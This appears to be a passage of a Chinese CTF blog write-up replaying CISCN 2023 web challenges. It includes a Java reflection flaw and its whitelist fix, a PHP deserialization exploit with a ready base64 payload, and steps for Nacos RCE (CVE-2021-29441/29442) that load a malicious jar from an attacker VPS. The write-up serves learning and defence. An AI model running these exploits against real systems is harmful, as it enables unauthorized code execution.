+<li>当<code>method</code>参数为其他值时，调用目标类的指定方法，并传入<code>X-Forwarded-For</code>请求头作为参数</li>
+</ul>
+<p>相当于是送上门的shell，本地打通</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251005152626153.png"
+                      alt="image-20251005152626153"
+                ></p>
+<p>靶机出网，但是靶机我不知到是不是环境的原因，无法通过&#96;&#96;命令执行，curl外带无果</p>
+<p>靶机感觉没bash环境一样，并且感觉啥命令都执行不了，还以为是windows环境，试了，是linux</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Linux下面区分大小写,即A.txt和a.txt不是一个文件；</span><br><span class="line">Windows下面不区分大小写，即A.txt和a.txt是一个文件</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251005161447974.png"
+                      alt="image-20251005161447974"
+                ></p>
+<p>后面试了重定向也不行，没招了。。。</p>
+<h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><p>直接白名单即可</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//原来的</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">logout</span><span class="params">(HttpServletRequest request, HttpSession session, <span class="meta">@RequestParam(defaultValue = &quot;logout&quot;)</span> String method, <span class="meta">@RequestParam(defaultValue = &quot;com.mengda.awd.Utils.SessionUtils&quot;)</span> String targetclass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; ObjectClass = Class.forName(targetclass);</span><br><span class="line">        Constructor&lt;?&gt; constructor = ObjectClass.getDeclaredConstructor();</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">CLassInstance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Method targetMethod;</span><br><span class="line">            <span class="keyword">if</span> (method.equals(<span class="string">&quot;logout&quot;</span>)) &#123;</span><br><span class="line">                targetMethod = ObjectClass.getMethod(method, HttpSession.class);</span><br><span class="line">                targetMethod.invoke(CLassInstance, session);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                targetMethod = ObjectClass.getMethod(method, String.class);</span><br><span class="line">                targetMethod.invoke(CLassInstance, request.getHeader(<span class="string">&quot;X-Forwarded-For&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修复后</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">logout</span><span class="params">(HttpServletRequest request, HttpSession session, <span class="meta">@RequestParam(defaultValue = &quot;logout&quot;)</span> String method, <span class="meta">@RequestParam(defaultValue = &quot;com.mengda.awd.Utils.SessionUtils&quot;)</span> String targetclass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; ObjectClass = Class.forName(targetclass);</span><br><span class="line">        Constructor&lt;?&gt; constructor = ObjectClass.getDeclaredConstructor();</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">CLassInstance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Method targetMethod;</span><br><span class="line">            <span class="comment">//写死</span></span><br><span class="line">            <span class="keyword">if</span> (method.equals(<span class="string">&quot;logout&quot;</span>)&amp;&amp;targetclass.equals(<span class="string">&quot;com.mengda.awd.Utils.SessionUtils&quot;</span>)) &#123;</span><br><span class="line">                targetMethod = ObjectClass.getMethod(method, HttpSession.class);</span><br><span class="line">                targetMethod.invoke(CLassInstance, session);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;redirect:/&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="ez-date"><a href="#ez-date" class="headerlink" title="ez_date"></a>ez_date</h1><p><strong>考点：md5,sha1强绕过 + php date()函数的\转义</strong></p>
+<p>源码：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a) || <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b))) &#123;</span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="variable">$uuid</span> = <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>, <span class="variable">$content</span>);</span><br><span class="line">            <span class="comment">//删除所有换行符和空白字符</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]));</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>绕过md5和sha1强相等</strong></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$a</span> = <span class="number">0.40000000000000002</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$b</span> = <span class="number">0.40000000000000402</span>;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>主要就是让<code>$content=&#39;/flag&#39;</code>，我本地复现就让$content&#x3D;’flag.txt’</p>
+<p>参考php date()函数的官方文档</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.date.php" >https://www.php.net/manual/zh/function.date.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251006184147541.png"
+                      alt="image-20251006184147541"
+                ></p>
+<p>利用 <code>\</code>反斜杠转义后会输出原字符</p>
+<p>故<code>$file = &#39;\/f\l\a\g&#39;;</code>，本地复现就是<code>$file = &#39;\f\l\a\g\.\t\x\t&#39;;</code></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="number">0.40000000000000002</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="number">0.40000000000000402</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&#x27;\f\l\a\g\.\t\x\t&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">date</span>()));</span><br><span class="line"><span class="comment">#Tzo0OiJkYXRlIjozOntzOjE6ImEiO2Q6MC40O3M6MToiYiI7ZDowLjQwMDAwMDAwMDAwMDAwNDtzOjQ6ImZpbGUiO3M6MTY6IlxmXGxcYVxnXC5cdFx4XHQiO30=</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251006190409462.png"
+                      alt="image-20251006190409462"
+                ></p>
+<h1 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h1><p>题目给了源码，一眼nacos框架，这题源码其实没多大用，主要是去分析Nacos的源码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251022160724194.png"
+                      alt="image-20251022160724194"
+                ></p>
+<p>看登陆界面也知道了</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251007180426838.png"
+                      alt="image-20251007180426838" style="zoom:50%;" 
+                >
+
+<p>参考：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/thebeastofwar/p/17920565.html" >https://www.cnblogs.com/thebeastofwar/p/17920565.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>直接未授权导致信息泄露CVE-2021-29441</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251007172808402.png"
+                      alt="image-20251007172808402"
+                ></p>
+<p>可直接添加用户</p>
+<p>工具</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251007173603543.png"
+                      alt="image-20251007173603543"
+                ></p>
+<p>BP包</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251007173754781.png"
+                      alt="image-20251007173754781"
+                ></p>
+<p>我用工具生成的内存马连不上，只能用网上的POC</p>
+<p>之后参考<a class="link"   target="_blank" rel="noopener" href="https://github.com/WingBy-Fkalis/Nacos_Rce/tree/main%E8%BF%9B%E8%A1%8CRCE" >https://github.com/WingBy-Fkalis/Nacos_Rce/tree/main进行RCE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>受影响版本的 Nacos 默认未开启身份认证</strong>，&#x2F;data&#x2F;removal 接口存在条件竞争漏洞，攻击者可借此接口执行恶意 SQL，加载恶意 jar 并注册函数，随后可以在未授权条件下利用 derby sql 注入漏洞（CVE-2021-29442）调用恶意函数来执行恶意代码</p>
+<p>记得这个poc公开是在去年，也就是说在2023年的时候这还是个0day</p>
+<p>原理可参考：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/xyz_dream/article/details/140823724" >https://blog.csdn.net/xyz_dream/article/details/140823724 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>1.VPS上启服务，配置config.py是service.py启动的一个HTTP接口， 这个接口是提供给Nacos里面deby数据库获取加载恶意jar包内容(HTTP接口响应是JAR包的二进制内容)</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251007175022997.png"
+                      alt="image-20251007175022997"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251007175246055.png"
+                      alt="image-20251007175246055"
+                ></p>
+<p>2.exploit.py 输入要工具的Nacos的IP和服务端口，已经RCE指令即可。 exploit.py会连接Nacos,然后请求Nacos的参数中注入了连接service.py的IP、端口，以及需要RCE的指令。 请求到达nacos之后，利用deby数据库的漏洞，恶意请求service.py服务的接口，加载jar包内容。 然后再输入RCE指令给jar包，运行这个命令<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251007175318663.png"
+                      alt="image-20251007175318663"
+                ></p>
+<p>我们这的路由要改一下，不要前面的&#x2F;nacos</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251007175433441.png"
+                      alt="image-20251007175433441"
+                ></p>
+<p>运行exp</p>
+<p><code>python exp1.py -t vps_ip -p 8000 -u http://xxx.xxx.xxx -c &quot;whoami&quot;</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251007175813658.png"
+                      alt="image-20251007175813658"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251007180237413.png"
+                      alt="image-20251007180237413"
+                ></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> CISCN 2023 WEB 复现</li>
+        <li><strong>Author:</strong> xiaolaisec</li>
+        <li><strong>Created at
+                :</strong> 2025-10-23 18:12:47</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-10-24 18:33:38
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/10/23/CISCN 2023 WEB/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/JAVA/">#JAVA</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/PHP/">#PHP</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Python/">#Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2025/11/20/2025-11-20-%E5%8D%8E%E4%B8%BA%E6%9D%AF2025-WP/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">华为杯2025 WP</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/10/22/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E9%A2%98/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">java反序列化专题</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">CISCN 2023 WEB 复现</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#filechecker"><span class="nav-text">filechecker</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-text">EXP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#go-session"><span class="nav-text">go_session</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#c-gin-Context%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">c *gin.Context的使用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#awdjava"><span class="nav-text">awdjava</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fix"><span class="nav-text">fix</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-date"><span class="nav-text">ez_date</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BackendService"><span class="nav-text">BackendService</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">xiaolaisec</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
